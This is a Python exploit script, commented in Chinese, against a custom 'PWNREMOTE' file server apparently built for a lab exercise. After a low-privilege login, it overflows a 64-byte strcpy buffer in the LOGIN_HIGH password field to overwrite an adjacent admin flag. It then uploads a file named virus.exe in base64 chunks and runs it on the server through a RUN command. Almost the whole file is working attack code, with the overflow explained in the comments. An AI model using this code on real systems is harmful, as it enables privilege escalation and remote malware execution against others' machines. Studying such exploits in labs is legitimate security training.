import socket
import json
import struct
import ctypes
import base64
import os
from ctypes import wintypes

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9000

LOW_USERNAME = "user"
LOW_PASSWORD = "123456" # 如果 server config 没设密码，这里可能需要置空或根据环境调整
ADMIN_USERNAME = "admin"
BANNER = b"PWNREMOTE/1.0 READY"


# --- 本地弹窗函数（关键新增）---
def show_local_success_dialog():
    """在本机弹出 Windows 消息框"""
    MessageBoxW = ctypes.windll.user32.MessageBoxW
    MessageBoxW.argtypes = [wintypes.HWND, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.UINT]
    MessageBoxW.restype = ctypes.c_int

    # 弹窗：标题 + 内容
    MessageBoxW(None, "Buffer Overflow Attack Success!", "PWNED", 0x40)  # 0x40 = MB_ICONINFORMATION
    

# --- 辅助函数 (保持不变) ---
def build_cmd(cmd, args):
    return {"type": "CMD", "cmd": cmd, "args": args}

def send_frame(sock, payload_dict):
    # 注意：ensure_ascii=True 会把不可见字符转义为 \uXXXX，服务器端的 JSON 解析器通常能自动还原为单字节
    json_data = json.dumps(payload_dict, separators=(",", ":"), ensure_ascii=True).encode("utf-8")
    length_header = struct.pack("!I", len(json_data))
    sock.sendall(length_header + json_data)

def recv_all(sock, size):
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk: return None
        data.extend(chunk)
    return bytes(data)

def recv_frame(sock):
    header = recv_all(sock, 4)
    if not header: return None
    length = struct.unpack("!I", header)[0]
    if length == 0: return b""
    return recv_all(sock, length)

def try_recv_frame(sock):
    try:
        return recv_frame(sock)
    except (socket.timeout, OSError):
        return None

def discard_banner(sock):
    try:
        sock.settimeout(0.2)
        peek = sock.recv(len(BANNER), socket.MSG_PEEK)
        if peek.startswith(BANNER):
            sock.recv(len(BANNER))
    except (socket.timeout, OSError):
        pass

def parse_response(resp_bytes):
    """Parse JSON response from server"""
    if not resp_bytes:
        return None
    try:
        return json.loads(resp_bytes.decode('utf-8'))
    except:
        return None

def check_file_exists(sock, filename):
    """Check if file exists on server using LIST_FILES command"""
    print(f"[*] Checking if {filename} exists on server...")
    
    list_req = build_cmd("LIST_FILES", {})
    send_frame(sock, list_req)
    
    list_resp_bytes = try_recv_frame(sock)
    if not list_resp_bytes:
        print("[-] LIST_FILES: No response")
        return False
    
    list_resp = parse_response(list_resp_bytes)
    if not list_resp or not list_resp.get("ok"):
        print(f"[-] LIST_FILES failed: {list_resp.get('msg', 'unknown error') if list_resp else 'parse error'}")
        return False
    
    # Get files array from response
    files_data = list_resp.get("data", {}).get("files", [])
    if not isinstance(files_data, list):
        return False
    
    # Check if filename is in the list
    for file_item in files_data:
        if isinstance(file_item, str) and file_item == filename:
            print(f"[+] File {filename} exists on server")
            return True
        elif isinstance(file_item, dict) and file_item.get("name") == filename:
            print(f"[+] File {filename} exists on server")
            return True
    
    print(f"[-] File {filename} not found on server")
    return False

def upload_file(sock, local_path, remote_name):
    """Upload file to server using UPLOAD_INIT -> UPLOAD_CHUNK -> UPLOAD_FINISH"""
    print(f"[*] Uploading {local_path} as {remote_name}...")
    
    # Check if file exists
    if not os.path.exists(local_path):
        print(f"[-] File not found: {local_path}")
        return False
    
    # Read file
    try:
        with open(local_path, 'rb') as f:
            file_data = f.read()
        file_size = len(file_data)
        print(f"[+] File size: {file_size} bytes")
    except Exception as e:
        print(f"[-] Failed to read file: {e}")
        return False
    
    # Step 1: UPLOAD_INIT
    default_chunk = 64 * 1024  # 64KB
    init_req = build_cmd("UPLOAD_INIT", {
        "filename": remote_name,
        "file_size": file_size,
        "chunk_size": default_chunk
    })
    send_frame(sock, init_req)
    init_resp_bytes = try_recv_frame(sock)
    if not init_resp_bytes:
        print("[-] UPLOAD_INIT: No response")
        return False
    
    init_resp = parse_response(init_resp_bytes)
    if not init_resp or not init_resp.get("ok"):
        print(f"[-] UPLOAD_INIT failed: {init_resp.get('msg', 'unknown error') if init_resp else 'parse error'}")
        return False
    
    upload_id = init_resp.get("data", {}).get("upload_id")
    chunk_size = init_resp.get("data", {}).get("chunk_size", default_chunk)
    next_index = init_resp.get("data", {}).get("next_index", 0)
    
    if not upload_id:
        print("[-] UPLOAD_INIT: Missing upload_id")
        return False
    
    print(f"[+] Upload session: id={upload_id}, chunk_size={chunk_size}, next_index={next_index}")
    
    # Step 2: UPLOAD_CHUNK (send file in chunks)
    chunk_index = next_index
    offset = 0
    
    while offset < file_size:
        chunk_data = file_data[offset:offset + chunk_size]
        if not chunk_data:
            break
        
        # Encode chunk to base64
        data_b64 = base64.b64encode(chunk_data).decode('utf-8')
        
        chunk_req = build_cmd("UPLOAD_CHUNK", {
            "upload_id": upload_id,
            "chunk_index": chunk_index,
            "data_b64": data_b64
        })
        send_frame(sock, chunk_req)
        
        chunk_resp_bytes = try_recv_frame(sock)
        if not chunk_resp_bytes:
            print(f"[-] UPLOAD_CHUNK[{chunk_index}]: No response")
            return False
        
        chunk_resp = parse_response(chunk_resp_bytes)
        if not chunk_resp or not chunk_resp.get("ok"):
            print(f"[-] UPLOAD_CHUNK[{chunk_index}] failed: {chunk_resp.get('msg', 'unknown error') if chunk_resp else 'parse error'}")
            return False
        
        received = chunk_resp.get("data", {}).get("received", 0)
        print(f"[+] Chunk {chunk_index} uploaded, total received: {received} bytes")
        
        offset += len(chunk_data)
        chunk_index += 1
    
    # Step 3: UPLOAD_FINISH
    finish_req = build_cmd("UPLOAD_FINISH", {
        "upload_id": upload_id
    })
    send_frame(sock, finish_req)
    finish_resp_bytes = try_recv_frame(sock)
    if not finish_resp_bytes:
        print("[-] UPLOAD_FINISH: No response")
        return False
    
    finish_resp = parse_response(finish_resp_bytes)
    if not finish_resp or not finish_resp.get("ok"):
        print(f"[-] UPLOAD_FINISH failed: {finish_resp.get('msg', 'unknown error') if finish_resp else 'parse error'}")
        return False
    
    final_filename = finish_resp.get("data", {}).get("filename", remote_name)
    final_size = finish_resp.get("data", {}).get("size", file_size)
    print(f"[+] Upload completed: {final_filename} ({final_size} bytes)")
    return True

def run_command(sock, cmd):
    """Run command on server using RUN command"""
    print(f"[*] Running command: {cmd}")
    
    run_req = build_cmd("RUN", {
        "cmd": cmd
    })
    send_frame(sock, run_req)
    
    run_resp_bytes = try_recv_frame(sock)
    if not run_resp_bytes:
        print("[-] RUN: No response")
        return False
    
    run_resp = parse_response(run_resp_bytes)
    if not run_resp:
        print("[-] RUN: Failed to parse response")
        return False
    
    if run_resp.get("ok"):
        print(f"[+] Command executed successfully: {run_resp.get('msg', 'OK')}")
        return True
    else:
        print(f"[-] Command execution failed: {run_resp.get('msg', 'unknown error')}")
        return False

# --- 攻击逻辑 ---

def debug_exploit():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((TARGET_IP, TARGET_PORT))
        print(f"[+] Connected to {TARGET_IP}:{TARGET_PORT}")
        discard_banner(sock)

        # 第一步：正常登录低权限账号
        # 必须先由 Guest -> Low 才能调用 LOGIN_HIGH
        print("[*] Step 1: LOGIN_LOW...")
        send_frame(sock, build_cmd("LOGIN_LOW", {"username": LOW_USERNAME, "password": LOW_PASSWORD}))
        resp_low = try_recv_frame(sock)
        print(f"[+] Response: {resp_low}")
        
        if not resp_low or b"ok\":true" not in resp_low:
            print("[-] LOGIN_LOW failed. Check credentials.")
            return

        # 第二步：构造 Payload 进行变量覆盖
        print("[*] Step 2: LOGIN_HIGH with raw payload...")

        # [ 漏洞原理 ]
        # buffer 是 char cipherBuf[64];
        # 后面紧接着 volatile int admin;
        # 我们填满 64 字节，第 65 字节写入 \x01。
        # strcpy 会自动补 \x00 在第 66 字节。
        # 结果: admin = 0x00000001 (Little Endian)
        
        # 注意：这里我们构造的是原始字符串，利用 JSON 的 \u0001 转义特性
        # 只要不是合法的 Hex 串，HexToBytes 就会失败，从而进入 return local.admin 的路径
        
        payload_str = "A" * 65

        
        login_high_req = build_cmd("LOGIN_HIGH", {
            "username": ADMIN_USERNAME, 
            # 关键：这里直接传字符串 Payload，不要再做 hex 编码
            "password_cipher_hex": payload_str 
        })
        
        send_frame(sock, login_high_req)
        
        resp_high = try_recv_frame(sock)
        print(f"[+] LOGIN_HIGH Response: {resp_high}")

        # 第三步：验证结果
        if resp_high:
            resp_high_json = parse_response(resp_high)
            if resp_high_json and resp_high_json.get("ok"):
                print("[*] LOGIN_HIGH succeeded! Admin privileges obtained.")
                show_local_success_dialog()
                
                # 第四步：检查文件是否存在，如果不存在则上传
                print("[*] Step 3: Checking if virus.exe exists on server...")
                virus_filename = "virus.exe"
                virus_path = os.path.join(os.path.dirname(__file__), "virus.exe")
                
                if check_file_exists(sock, virus_filename):
                    # 文件已存在，直接运行
                    print("[*] File already exists, skipping upload")
                else:
                    # 文件不存在，需要上传
                    print("[*] Step 3: Uploading virus.exe...")
                    if not upload_file(sock, virus_path, virus_filename):
                        print("[-] Upload failed, skipping run command")
                        sock.close()
                        return
                
                # 第五步：运行 virus.exe
                print("[*] Step 4: Running virus.exe...")
                # 文件存储在服务器的 storage_dir（默认 server_files）
                run_command(sock, "server_files\\virus.exe")
            else:
                print("[*] LOGIN_HIGH response received but may have failed.")
        else:
            print("[-] No response from server.")

        sock.close()

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    debug_exploit()
